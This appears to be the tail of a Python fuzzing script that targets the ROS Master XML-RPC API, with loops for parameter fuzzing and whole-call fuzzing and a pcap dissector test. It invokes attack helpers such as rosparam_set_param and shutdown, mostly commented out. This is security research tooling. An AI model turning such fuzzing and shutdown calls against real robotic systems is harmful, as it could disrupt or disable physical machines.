# errors_list = []  #  a list containing each
#
# valid_list_name = [b"/rosdistro"]
# valid_list_value = [b"indigo"]
#
# while True:
#     origin_port = random.randint(1000, 65000)
#     rosparam_set_param_fuzzing()
#     red("Error candidates: " + str(len(errors_list)))
#     yellow("Valid name candidates: " + str(len(valid_list_name)))
#     yellow("Valid value candidates: " + str(len(valid_list_value)))
#     magenta("Weird candidates: " + str(len(weird_list)))


# ##############################
# # fuzzing whole XMLRPCCall
# ##############################
# weird_list = []
# errors_list = []
# valid_list = [
#     raw(package_rosparam_get_rosdistro[XMLRPCCall]),
#     raw(package_getPid[XMLRPCCall]),
#     # raw(package_shutdown[XMLRPCCall]),
# ]
#
# while True:
#     origin_port = random.randint(1000, 65000)
#     fuzz_XMLRPC()
#     red("Error candidates: " + str(len(errors_list)))
#     yellow("Valid candidates: " + str(len(valid_list)))
#     magenta("Weird candidates: " + str(len(weird_list)))


#############################
# individual attacks testing (no real fuzzing in here)
#############################
origin_port = random.randint(1000, 65000)

field_to_fuzz = "params"  # "methodname", "params"
weird_list = []  # list containing weird/non-accounted responses
errors_list = []  #  a list containing each
valid_list = []

# while True:
#     origin_port = random.randint(1000, 65000)
#     rosparam_get_rosdistro()  # send a rosparam get /rosdistro request

rosparam_get_rosdistro()  # send a rosparam get /rosdistro request
# getpid()  # fetch PID from ROS Master
# rosparam_set_param()  # set the param
# shutdown()
# fuzz_XMLRPC()


# ###### Testing of the dissector ##########
#
# # packages = rdpcap("test.pcap")
# packages = rdpcap("test3.pcap")
# packages.show()
#
# p = packages[3]
# # print(p.summary())
#
# # print(p)
# # p.show()
# # print(p.command())
# # hexdump(p)
# ############################
